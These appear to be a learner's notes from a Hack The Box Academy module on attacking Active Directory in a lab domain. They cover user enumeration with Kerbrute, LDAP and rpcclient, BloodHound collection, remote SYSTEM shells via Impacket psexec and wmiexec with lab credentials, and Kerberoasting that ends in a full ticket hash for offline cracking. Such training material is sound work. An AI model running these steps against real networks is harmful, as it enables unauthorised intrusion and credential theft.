#### Connect to RDP:

```shell-session
trmchale@htb[/htb]$ xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!
```

##### Responder

Our first look at network traffic pointed us to a couple of hosts via `MDNS` and `ARP`. Now let's utilize a tool called `Responder` to analyze network traffic and determine if anything else in the domain pops up.

[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.

```bash
sudo responder -I ens224 -A 
```

##### Fping
Here we'll start `fping` with a few flags: `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.

```shell-session
trmchale@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```

### Kerbrute - Internal AD Username Enumeration

[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.

To get started with Kerbrute, we can download [precompiled binaries](https://github.com/ropnop/kerbrute/releases/latest) for the tool for testing from Linux, Windows, and Mac, or we can compile it ourselves. This is generally the best practice for any tool we introduce into a client environment. To compile the binaries to use on the system of our choosing, we first clone the repo:

```shell-session
trmchale@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git

trmchale@htb[/htb]$ sudo make all

trmchale@htb[/htb]$ ls dist/

kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe

trmchale@htb[/htb]$ ./kerbrute_linux_amd64 


trmchale@htb[/htb]$ echo $PATH
/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools

trmchale@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

trmchale@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds

```

## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable. One example command to get the password policy is as follows:

#### Using ldapsearch

  Enumerating & Retrieving Password Policies

```shell-session
trmchale@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```

Here we can see the minimum password length of 8, lockout threshold of 5, and password complexity is set (`pwdProperties` set to `1`).

#### Using enum4linux

  Password Spraying - Making a Target User List

```shell-session
trmchale@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```

#### Using rpcclient

  Password Spraying - Making a Target User List

```shell-session
trmchale@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```

#### Using CrackMapExec --users Flag

  Password Spraying - Making a Target User List

```shell-session
trmchale@htb[/htb]$ crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613

<SNIP>
```


## Gathering Users with LDAP Anonymous

We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and [ldapsearch](https://linux.die.net/man/1/ldapsearch). If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter. We can learn more about these search filters in the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

#### Using ldapsearch

  Password Spraying - Making a Target User List

```shell-session
trmchale@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>
```

Tools such as `windapsearch` make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.

#### Using windapsearch

  Password Spraying - Making a Target User List

```shell-session
trmchale@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

cn: Fae Anthony
userPrincipalName: fanthony@inlanefreight.local

cn: Walter Dillard
userPrincipalName: wdillard@inlanefreight.local

<SNIP>
```

## Enumerating Users with Kerbrute

As mentioned in the `Initial Enumeration of The Domain` section, if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.

Let's try out this method using the [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist of 48,705 possible common usernames in the format `flast`. The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using `Kerbrute`.

#### Kerbrute User Enumeration

  Password Spraying - Making a Target User List

```shell-session
trmchale@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

<SNIP>
```

## Impacket Toolkit

Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) and [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Earlier in the poisoning section, we grabbed a hash for the user `wley` with `Responder` and cracked it to obtain the password `transporter@4`. We will see in the next section that this user is a local admin on the `ACADEMY-EA-FILE` host. We will utilize the credentials for the next few actions.

#### Psexec.py

One of the most useful tools in the Impacket suite is `psexec.py`. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

#### Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

Code: bash

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

#### wmiexec.py

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

#### Using wmiexec.py

Code: bash

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

## Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

#### Windapsearch - Domain Admins

  Credentialed Enumeration - from Linux

```shell-session
trmchale@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>
```

From the results in the shell above, we can see that it enumerated 28 users from the Domain Admins group. Take note of a few users we have already seen before and may even have a hash or cleartext password like `wley`, `svc_qualys`, and `lab_adm`.

To identify more potential users, we can run the tool with the `-PU` flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.

#### Windapsearch - Privileged Users

  Credentialed Enumeration - from Linux

```shell-session
trmchale@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

<SNIP>

[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 3 nested users for group Enterprise Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

<SNIP>
```

You'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.

## Bloodhound.py

Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses [graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).

#### Executing BloodHound.py

  Credentialed Enumeration - from Linux

```shell-session
trmchale@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>
```

The command above executed Bloodhound.py with the user `forend`. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c all` flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date_object.json>.

#### Viewing the Results

  Credentialed Enumeration - from Linux

```shell-session
trmchale@htb[/htb]$ ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
```

To start the GUI run:

```
sudo neo4j start
```

## Kerberoasting Overview

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

For an interesting look at the origin of this technique, check out the [talk](https://youtu.be/PUyhlN-E5MU) Tim Medin gave at Derbycon 2014, showcasing Kerberoasting to the world.

---

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be `cracked` offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

#### Listing SPN Accounts with GetUserSPNs.py

  Kerberoasting - from Linux

```shell-session
trmchale@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```

We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.

#### Requesting all TGS Tickets

  Kerberoasting - from Linux

```shell-session
trmchale@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>               



$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$b6be1ba275e23edd3b7dd3ad4d711c68f9170bac85e722cc3d94c80c5dca6bf2f07ed3d3bc209e9a6ff0445cab89923b26a01879a53249c5f0a8c4bb41f0ea1b1196c322640d37ac064ebe3755ce888947da98b5707e6b06cbf679db1e7bbbea7d10c36d27f976d3f9793895fde20d3199411a90c528a51c91d6119cb5835bd29457887dd917b6c621b91c2627b8dee8c2c16619dc2a7f6113d2e215aef48e9e4bba8deff329a68666976e55e6b3af0cb8184e5ea6c8c2060f8304bb9e5f5d930190e08d03255954901dc9bb12e53ef87ed603eb2247d907c3304345b5b481f107cefdb4b01be9f4937116016ef4bbefc8af2070d039136b79484d9d6c7706837cd9ed4797ad66321f2af200bba66f65cac0584c42d900228a63af39964f02b016a68a843a81f562b493b29a4fc1ce3ab47b934cbc1e29545a1f0c0a6b338e5ac821fec2bee503bc56f6821945a4cdd24bf355c83f5f91a671bdc032245d534255aac81d1ef318d83e3c52664cfd555d24a632ee94f4adeb258b91eda3e57381dba699f5d6ec7b9a8132388f2346d33b670f1874dfa1e8ee13f6b3421174a61029962628f0bc84fa0c3c6d7bbfba8f2d1900ef9f7ed5595d80edc7fc6300385f9aa6ce1be4c5b8a764c5b60a52c7d5bbdc4793879bfcd7d1002acbe83583b5a995cf1a4bbf937904ee6bb537ee00d99205ebf5f39c722d24a910ae0027c7015e6daf73da77af1306a070fdd50aed472c444f5496ebbc8fe961fee9997651daabc0ef0f64d47d8342a499fa9fb8772383a0370444486d4142a33bc45a54c6b38bf55ed613abbd0036981dabc88cc88a5833348f293a88e4151fbda45a28ccb631c847da99dd20c6ea4592432e0006ae559094a4c546a8e0472730f0287a39a0c6b15ef52db6576a822d6c9ff06b57cfb5a2abab77fd3f119caaf74ed18a7d65a47831d0657f6a3cc476760e7f71d6b7cf109c5fe29d4c0b0bb88ba963710bd076267b889826cc1316ac7e6f541cecba71cb819eace1e2e2243685d6179f6fb6ec7cfcac837f01989e7547f1d6bd6dc772aed0d99b615ca7e44676b38a02f4cb5ba8194b347d7f21959e3c41e29a0ad422df2a0cf073fcfd37491ac062df903b77a32101d1cb060efda284cae727a2e6cb890f4243a322794a97fc285f04ac6952aa57032a0137ad424d231e15b051947b3ec0d7d654353c41d6ad30c6874e5293f6e25a95325a3e164abd6bc205e5d7af0b642837f5af9eb4c5bca9040ab4b999b819ed6c1c4645f77ae45c0a5ae5fe612901c9d639392eaac830106aa249faa5a895633b20f553593e3ff01a9bb529ff036005ec453eaec481b7d1d65247abf62956366c0874493cf16da6ffb9066faa5f5bc1db5bbb51d9ccadc6c97964c7fe1be2fb4868f40b3b59fa6697443442fa5cebaaed9db0f1cb8476ec96bc83e74ebe51c025e14456277d0a7ce31e8848d88cbac9b57ac740f4678f71a300b5f50baa6e6b85a3b10a10f44ec7f708624212aeb4c60877322268acd941d590f81ffc7036e2e455e941e2cfb97e33fec5055284ae48204d
